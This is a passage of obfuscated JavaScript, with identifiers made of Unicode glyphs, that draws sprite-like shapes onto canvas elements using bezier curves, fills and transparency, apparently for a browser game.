			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 253 * ᐃ;
			Ⲇⵠ.height = ᐃ * 260;
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 126.5 * ᐃ, 134 * ᐃ, ᐃ * 119);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, 126.5 * ᐃ, 124 * ᐃ, ᐃ * 119);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆⲆⲆΔ);
			ⵠᐃᐃ(Δ, ᐃ * 126.5, ᐃ * 127, ᐃ * ᐃᐃᐃⵠⵠⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 126.5 * ᐃ, ᐃ * 135, ᐃ * 81);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			Δ.globalAlpha = ⵠΔᐃ;
			ⵠᐃᐃ(Δ, ᐃ * 126.5, 125 * ᐃ, 84 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * ⵠΔᐃΔ);
			ⵠᐃᐃ(Δ, ᐃ * 126.5, 125 * ᐃ, 61 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], ⵠᐃᐃⲆ * ᐃ);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, ᐃ * 126.5, 134 * ᐃ, 40 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, ᐃ * 126.5, ᐃ * 125, 40 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[9]);
			return Ⲇⵠ
		}

		function ᐃⵠΔᐃΔⲆⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 100;
			Ⲇⵠ.height = ⵠᐃᐃᐃᐃΔⵠ * ᐃ;
			Δ.globalAlpha = .5;
			Δ.fillStyle = Ⲇᐃ[0];
			Δ.fillRect(ΔΔⵠⵠ, 0, Ⲇⵠ.width, Ⲇⵠ.height);
			return Ⲇⵠ
		}

		function ΔⵠΔᐃΔΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 139;
			Ⲇⵠ.height = ᐃ * 135;
			Δ.translate(0, 10 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(32 * ᐃ, ᐃ * 77);
			Δ.bezierCurveTo(ᐃⵠⲆⵠΔ * ᐃ, 41 * ᐃ, 6 * ᐃ, 33 * ᐃ, ⵠⲆΔΔᐃ * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 27, 6 * ᐃ, ᐃ * 28, ᐃ * ⲆᐃⲆᐃ, ᐃ * 37, 6 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62, ᐃ * ΔΔᐃΔ, ᐃ * 64, 5 * ᐃ, 67 * ᐃ, ⲆⵠⵠⵠⵠᐃΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80, 36 * ᐃ, 73.5 * ᐃ, 25 * ᐃ, 80 * ᐃ, ᐃ * 37);
			Δ.bezierCurveTo(73.5 * ᐃ, ᐃ * 54, 65 * ᐃ, 74 * ᐃ, 67 * ᐃ, ᐃ * 71);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 65, 37 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 105, ᐃ * 40, 113 * ᐃ, ᐃ * 39, ᐃ * 117, ᐃ * 48);
			Δ.bezierCurveTo(126 * ᐃ, ᐃ * 70, ᐃ * 128, 72 * ᐃ, ᐃ * 124, 80 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 101, ᐃ * 110, ᐃ * 104, 99 * ᐃ, 104 * ᐃ);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * ΔᐃⲆⲆⲆ, 55 * ᐃ, 99 * ᐃ, 56 * ᐃ, ᐃ * 99);
			Δ.bezierCurveTo(47.5 * ᐃ, 79 * ᐃ, 45 * ᐃ, 66 * ᐃ, 39 * ᐃ, ᐃ * 59);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 30, 63 * ᐃ);
			Δ.bezierCurveTo(ⵠⵠΔⵠ * ᐃ, 99 * ᐃ, ᐃ * 5, 101 * ᐃ, ᐃ * 8, ᐃ * 103);
			Δ.bezierCurveTo(19 * ᐃ, ᐃ * 123, 22 * ᐃ, 125 * ᐃ, 28 * ᐃ, ᐃ * 126);
			Δ.bezierCurveTo(ᐃ * 57, 127 * ᐃ, ᐃ * 55, 127 * ᐃ, 58 * ᐃ, 120 * ᐃ);
			Δ.bezierCurveTo(82 * ᐃ, 86 * ᐃ, ᐃ * 83, ᐃ * 78, 82 * ᐃ, 87 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(0, ᐃ * -ⲆⵠⲆⲆᐃ);
			Δ.globalAlpha = Ⲇᐃⵠ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 32, ᐃ * 77);
			Δ.bezierCurveTo(ᐃ * ⵠᐃᐃΔΔ, 41 * ᐃ, 6 * ᐃ, ᐃ * 33, ⵠΔᐃΔᐃ * ᐃ, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 27, ᐃ * 6, ᐃ * 28, ᐃ * ⲆΔᐃⵠⵠᐃⵠ, 37 * ᐃ, Δⵠᐃᐃⵠ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62, ᐃ * 3, 64 * ᐃ, 5 * ᐃ, 67 * ᐃ, ᐃ * ΔⵠⲆΔⲆⲆᐃ);
			Δ.bezierCurveTo(80 * ᐃ, 36 * ᐃ, 73.5 * ᐃ, ᐃ * 25, 80 * ᐃ, ᐃ * 37);
			Δ.bezierCurveTo(73.5 * ᐃ, ᐃ * 54, 65 * ᐃ, ᐃ * 74, 67 * ᐃ, 71 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 65, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 105, 40 * ᐃ, 113 * ᐃ, ᐃ * 39, 117 * ᐃ, 48 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126, 70 * ᐃ, 128 * ᐃ, 72 * ᐃ, 124 * ᐃ, 80 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 101, ᐃ * 110, ᐃ * 104, ᐃ * 99, ᐃ * 104);
			Δ.bezierCurveTo(ᐃ * 59, ᐃ * 100, 55 * ᐃ, ᐃ * 99, 56 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47.5, 79 * ᐃ, ᐃ * 45, ᐃ * 66, ᐃ * 39, 59 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(30 * ᐃ, 63 * ᐃ);
			Δ.bezierCurveTo(ΔΔᐃⲆ * ᐃ, 99 * ᐃ, ⲆΔΔᐃ * ᐃ, ᐃ * 101, ᐃⵠⲆᐃᐃ * ᐃ, 103 * ᐃ);
			Δ.bezierCurveTo(19 * ᐃ, 123 * ᐃ, ᐃ * 22, 125 * ᐃ, ᐃ * 28, 126 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 127 * ᐃ, ᐃ * 55, ᐃ * 127, 58 * ᐃ, 120 * ᐃ);
			Δ.bezierCurveTo(82 * ᐃ, 86 * ᐃ, 83 * ᐃ, ᐃ * 78, 82 * ᐃ, ᐃ * 87);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(80 * ᐃ, ᐃ * 38);
			Δ.bezierCurveTo(72.5 * ᐃ, 52 * ᐃ, ᐃ * 72.5, 52 * ᐃ, 65 * ᐃ, 66 * ᐃ);
			Δ.bezierCurveTo(47.5 * ᐃ, ᐃ * 37, 47.5 * ᐃ, 37 * ᐃ, ᐃ * 30, ᐃ * 7);
			Δ.bezierCurveTo(ᐃ * 48, ΔⲆᐃⵠᐃ * ᐃ, ᐃ * 57, ᐃⲆᐃⲆⵠ * ᐃ, 64 * ᐃ, ΔᐃⲆⲆⵠ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(65 * ᐃ, 65 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125, 73 * ᐃ, ᐃ * 95.5, 69 * ᐃ, 126 * ᐃ, ᐃ * 73);
			Δ.bezierCurveTo(ᐃ * 119, ᐃ * 98, ᐃ * 106, ᐃ * 104, 98 * ᐃ, ᐃ * 103);
			Δ.bezierCurveTo(84.5 * ᐃ, 102 * ᐃ, 84.5 * ᐃ, 102 * ᐃ, 71 * ᐃ, 101 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 64, 86 * ᐃ, ᐃ * 64, ᐃ * 86, ᐃ * 57, ᐃ * 70);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(27 * ᐃ, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 64, ᐃ * 65, 46 * ᐃ, 67 * ᐃ, 65 * ᐃ, 65 * ᐃ);
			Δ.bezierCurveTo(43.5 * ᐃ, 94 * ᐃ, 43.5 * ᐃ, ᐃ * 94, 22 * ᐃ, 123 * ᐃ);
			Δ.bezierCurveTo(8 * ᐃ, 103 * ᐃ, 8 * ᐃ, ᐃ * 103, 9 * ᐃ, ᐃ * 103);
			Δ.bezierCurveTo(ᐃ * ⵠⲆᐃᐃ, 98 * ᐃ, ⲆⵠΔΔᐃᐃᐃ * ᐃ, 89 * ᐃ, 26 * ᐃ, ᐃ * 70);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 26, ᐃ * 69);
			Δ.bezierCurveTo(65 * ᐃ, 60 * ᐃ, 45 * ᐃ, 65 * ᐃ, 64 * ᐃ, ᐃ * 60);
			Δ.bezierCurveTo(ᐃ * 63, 65 * ᐃ, 63 * ᐃ, ᐃ * 65, ᐃ * 62, ᐃ * 70);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 80, 38 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 68, ᐃ * 70, 75 * ᐃ, ᐃ * 53, ᐃ * 70, ᐃ * 68);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 67, ᐃ * 65, 67 * ᐃ, ᐃ * 60, ᐃ * 65);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ]);
			return Ⲇⵠ
		}

		function ⵠⵠⵠᐃⵠⵠᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 173 * ᐃ;
			Ⲇⵠ.height = 178 * ᐃ;
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 86.5 * ᐃ, ᐃ * 98, 80 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.globalAlpha = ΔⵠΔⵠ;
			ⵠᐃᐃ(Δ, 86.5 * ᐃ, ᐃ * 89, ᐃ * 81);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ], Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * 4);
			ⵠᐃᐃ(Δ, ᐃ * 86.5, 86 * ᐃ, 59 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠΔᐃΔ], ᐃ * 4);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 86.5 * ᐃ, 95 * ᐃ, ᐃ * 34);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, ᐃ * 86.5, 89 * ᐃ, ᐃ * 34);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}
		const ⲆⲆΔΔⲆⲆⵠ = ᐃΔⲆᐃⵠ;

		function ⲆΔΔᐃⵠΔⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 33;
			Ⲇⵠ.height = ᐃ * 35;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 12.75, ᐃ * 7.1328125);
			Δ.bezierCurveTo(26.75 * ᐃ, 8.1328125 * ᐃ, 27.75 * ᐃ, ᐃ * 14.1328125, ᐃ * 24.75, 23.1328125 * ᐃ);
			Δ.bezierCurveTo(19.75 * ᐃ, ᐃ * 31.1328125, ᐃ * 15.75, 33.1328125 * ᐃ, 6.75 * ᐃ, ᐃ * 26.1328125);
			Δ.bezierCurveTo(ᐃ * .75, ᐃ * 19.1328125, 4.75 * ᐃ, ᐃ * 8.1328125, 12.75 * ᐃ, ᐃ * 7.1328125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			return Ⲇⵠ
		}

		function ΔΔⵠΔΔᐃΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 120 * ᐃ;
			Ⲇⵠ.height = 280 * ᐃ;
			Δ.translate(-ⵠⲆⲆᐃⵠΔⵠ * ᐃ, ᐃ * -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 228.5, ᐃ * 331.953125);
			Δ.bezierCurveTo(228.5 * ᐃ, ᐃ * 12.953125, 228.5 * ᐃ, ᐃ * 171.453125, 228.5 * ᐃ, 10.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 196.5, 76.953125 * ᐃ, ᐃ * 206.5, ᐃ * 78.953125, 191.5 * ᐃ, ᐃ * 114.953125);
			Δ.bezierCurveTo(ᐃ * 162.5, ᐃ * 170.953125, 206.5 * ᐃ, 220.953125 * ᐃ, ᐃ * 210.5, ᐃ * 251.953125);
			Δ.bezierCurveTo(218.5 * ᐃ, 287.953125 * ᐃ, 220.5 * ᐃ, 291.953125 * ᐃ, 228.5 * ᐃ, ᐃ * 331.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃᐃ]);
			return Ⲇⵠ
		}

		function ΔⵠΔΔᐃΔΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 120;
			Ⲇⵠ.height = ᐃ * 330;
			Δ.translate(-60 * ᐃ, ᐃ * -ᐃΔᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(188.5 * ᐃ, ᐃ * 7.953125);
			Δ.bezierCurveTo(188.5 * ᐃ, 334.953125 * ᐃ, 188.5 * ᐃ, 332.953125 * ᐃ, 188.5 * ᐃ, 339.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 166.5, 295.953125 * ᐃ, 145.5 * ᐃ, ᐃ * 295.953125, ᐃ * 139.5, ᐃ * 282.953125);
			Δ.bezierCurveTo(ᐃ * 124.5, ᐃ * 244.953125, ᐃ * 139.5, ᐃ * 243.953125, ᐃ * 131.5, 212.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118.5, ᐃ * 161.953125, 69.5 * ᐃ, ᐃ * 156.953125, 74.5 * ᐃ, 92.953125 * ᐃ);
			Δ.bezierCurveTo(85.5 * ᐃ, ᐃ * 41.953125, ᐃ * 158.5, ᐃ * 49.953125, 188.5 * ᐃ, 7.953125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			return Ⲇⵠ
		}

		function ⲆⵠΔᐃᐃⲆⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 85;
			Ⲇⵠ.height = 145 * ᐃ;
			Δ.translate(ᐃ * -ᐃⲆᐃΔⵠ, -95 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 50, ᐃ * 105);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 119, 64 * ᐃ, 137 * ᐃ, 71 * ᐃ, ᐃ * 146);
			Δ.bezierCurveTo(ᐃ * 71, 161 * ᐃ, ᐃ * 74, ᐃ * 169, 79 * ᐃ, ᐃ * 179);
			Δ.bezierCurveTo(ᐃ * 68, ᐃ * 192, 70 * ᐃ, 204 * ᐃ, ᐃ * 69, ᐃ * 216);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 189.5, 50 * ᐃ, ᐃ * 189.5, 31 * ᐃ, 163 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 44, 106 * ᐃ);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 90, 58 * ᐃ, ᐃ * 104, ᐃ * 51, 121 * ᐃ);
			Δ.bezierCurveTo(45 * ᐃ, ᐃ * 143, 41 * ᐃ, 151 * ᐃ, 37 * ᐃ, ᐃ * 162);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 180, ᐃ * 58, ᐃ * 188, 76 * ᐃ, ᐃ * 205);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 209, 105 * ᐃ, 229 * ᐃ, 92 * ᐃ, 235 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * 239, ᐃ * 75, ᐃ * 232, ᐃ * 56, 213 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 31, 187 * ᐃ, ᐃ * 28, ᐃ * 176, ᐃ * 23, ᐃ * 162);
			Δ.bezierCurveTo(ᐃ * 38, ᐃ * 131, ᐃ * 40, 120 * ᐃ, ᐃ * 44, ᐃ * 106);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * Ⲇⵠⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 30, ᐃ * 159);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 157, 59 * ᐃ, ᐃ * 152, 68 * ᐃ, 148 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, ᐃ * 155, ᐃ * 52, ᐃ * 160, ᐃ * 44, ᐃ * 164);
			Δ.bezierCurveTo(ᐃ * 59, 169 * ᐃ, 66 * ᐃ, 174 * ᐃ, ᐃ * 75, 178 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 58, ᐃ * 178, 49 * ᐃ, 175 * ᐃ, 37 * ᐃ, 174 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			return Ⲇⵠ
		}

		function ⲆⵠⵠⲆᐃΔⲆⲆⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 147 * ᐃ;
			Ⲇⵠ.height = ᐃ * 172;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 8, 50 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 15, 16 * ᐃ, 49 * ᐃ, 6 * ᐃ, 67 * ᐃ, ᐃⵠⲆⵠΔ * ᐃ);
			Δ.bezierCurveTo(121 * ᐃ, ᐃ * ⵠⲆΔⵠΔ, 128 * ᐃ, 32 * ᐃ, ᐃ * 135, ᐃ * 48);
			Δ.bezierCurveTo(ᐃ * 146, 96 * ᐃ, 124 * ᐃ, 131 * ᐃ, ᐃ * 96, ᐃ * 135);
			Δ.bezierCurveTo(ᐃ * 96, 158 * ᐃ, ᐃ * 79, ᐃ * 156, ᐃ * 75, 156 * ᐃ);
			Δ.bezierCurveTo(50 * ᐃ, ᐃ * 154, ᐃ * 53, ᐃ * 150, 52 * ᐃ, ᐃ * 135);
			Δ.bezierCurveTo(ⲆᐃᐃⲆ * ᐃ, ᐃ * 127, ⵠⵠⵠᐃ * ᐃ, ᐃ * 87, ᐃ * ᐃⵠⵠⵠⲆ, ᐃ * 50);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(14 * ᐃ, 57 * ᐃ);
			Δ.bezierCurveTo(ᐃⲆⵠᐃ * ᐃ, ᐃ * 50, ᐃ * ⵠⲆᐃᐃ, 22 * ᐃ, ᐃ * 24, 22 * ᐃ);
			Δ.bezierCurveTo(41 * ᐃ, ᐃ * 21, ᐃ * 54, 32 * ᐃ, 55 * ᐃ, ᐃ * 48);
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * ΔⲆⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(93 * ᐃ, ᐃ * 47);
			Δ.bezierCurveTo(94 * ᐃ, 24 * ᐃ, ᐃ * 116, 21 * ᐃ, 120 * ᐃ, ᐃ * ⲆⲆⲆⵠΔ);
			Δ.bezierCurveTo(144 * ᐃ, ᐃ * ΔΔΔᐃᐃⵠΔ, ᐃ * 146, 52 * ᐃ, ᐃ * 133, 58 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * 4);
			return Ⲇⵠ
		}

		function ᐃⵠΔΔᐃᐃᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 161;
			Ⲇⵠ.height = 190 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(Δⵠᐃ, 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * ⵠⲆⲆΔᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 17, ᐃ * 95, 19 * ᐃ, ᐃ * 95, ᐃ * 21, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 9, 83 * ᐃ, ᐃ * 17, 93 * ᐃ, ᐃ * ⵠⵠΔᐃΔ, ᐃ * 76);
			Δ.bezierCurveTo(ᐃᐃⲆΔΔⲆᐃ * ᐃ, 75 * ᐃ, 11 * ᐃ, 75 * ᐃ, ᐃⲆⲆⵠⵠΔΔ * ᐃ, 75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 13, 67 * ᐃ, ᐃ * 13, 67 * ᐃ, 7 * ᐃ, ᐃ * 59);
			Δ.bezierCurveTo(ⵠⲆΔᐃᐃ * ᐃ, 59 * ᐃ, ᐃ * ⲆⵠⵠᐃⲆⲆΔ, ᐃ * 59, ᐃ * 21, 59 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46, ᐃ * 35, ᐃ * 35, ᐃ * 45, ᐃ * 49, ᐃ * 31);
			Δ.bezierCurveTo(ᐃ * 53, 24 * ᐃ, 51 * ᐃ, ᐃ * 21, 51 * ᐃ, ᐃ * ᐃⲆⲆΔΔⵠΔ);
			Δ.bezierCurveTo(ᐃ * 63, 23 * ᐃ, 63 * ᐃ, 24 * ᐃ, ᐃ * 69, 29 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * ᐃΔⲆΔᐃ, 75 * ᐃ, ᐃ * ⲆⲆΔᐃᐃⲆⲆ, ᐃ * 76, ᐃ * 6);
			Δ.bezierCurveTo(81 * ᐃ, ⵠΔᐃΔᐃ * ᐃ, ᐃ * 84, ⲆᐃΔⵠΔ * ᐃ, ᐃ * 89, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 95, ᐃ * 25, 100 * ᐃ, ᐃ * 16, ᐃ * 105, ᐃ * 14);
			Δ.bezierCurveTo(103 * ᐃ, ᐃ * 25, 111 * ᐃ, 33 * ᐃ, ᐃ * 110, 34 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123, 48 * ᐃ, ᐃ * 123, ᐃ * 48, ᐃ * 136, ᐃ * 62);
			Δ.bezierCurveTo(ᐃ * 142, ᐃ * 60, ᐃ * 147, ᐃ * 59, 155 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(ᐃ * 147, 65 * ᐃ, 147 * ᐃ, 65 * ᐃ, ᐃ * 139, 73 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 73, ᐃ * 145, ᐃ * 73, 151 * ᐃ, ᐃ * 73);
			Δ.bezierCurveTo(ᐃ * 145, 80 * ᐃ, ᐃ * 145, 80 * ᐃ, ᐃ * 138, 87 * ᐃ);
			Δ.bezierCurveTo(144 * ᐃ, ᐃ * 88, 144 * ᐃ, 88 * ᐃ, ᐃ * 150, 89 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125, 103 * ᐃ, 125 * ᐃ, ᐃ * 125, 113 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, 178 * ᐃ, ᐃ * 85, 177 * ᐃ, 76 * ᐃ, ᐃ * 178);
			Δ.bezierCurveTo(ᐃ * 64, ᐃ * 179, ᐃ * 51, 164 * ᐃ, ᐃ * 35, ᐃ * 131);
			Δ.bezierCurveTo(18 * ᐃ, 95 * ᐃ, 13 * ᐃ, ᐃ * 99, ᐃ * ⵠⵠⵠΔᐃ, ᐃ * 93);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.globalAlpha = ⵠᐃⵠΔ;
			Δ.translate(0, -8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 9, ᐃ * 93);
			Δ.bezierCurveTo(ᐃ * ⲆᐃⲆⲆΔⲆⲆ, 95 * ᐃ, 19 * ᐃ, 95 * ᐃ, ᐃ * 21, ᐃ * 95);
			Δ.bezierCurveTo(ᐃ * 9, ᐃ * 83, ⵠⲆᐃⵠⵠΔⵠ * ᐃ, 93 * ᐃ, ᐃ * ᐃⲆᐃⲆⵠ, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 11, 75 * ᐃ, ᐃ * 11, ᐃ * 75, ᐃ * 18, ᐃ * 75);
